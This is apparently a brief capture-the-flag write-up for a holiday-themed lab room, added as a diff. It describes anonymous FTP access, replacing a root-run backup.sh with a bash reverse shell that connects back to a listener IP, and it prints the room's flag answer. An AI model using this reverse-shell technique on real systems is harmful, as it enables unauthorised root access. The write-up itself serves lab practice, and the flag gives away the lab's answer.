@@ -1,0 +1,15 @@
+Connect to ftp with anonymous login.
+We have access to public folder having two files:
+	backup.sh
+	shoppinglist.txt
+
+Get the files.
+
+cat shopping list : The Polar Express
+
+Change backup.sh : replace code with bash reverse shell
+	bash -i >& /dev/tcp/10.9.241.177/4444 0>&1
+
+Reupload the file and set up listener:
+
+We got a shell as root : cat the flag : THM{even_you_can_be_santa}
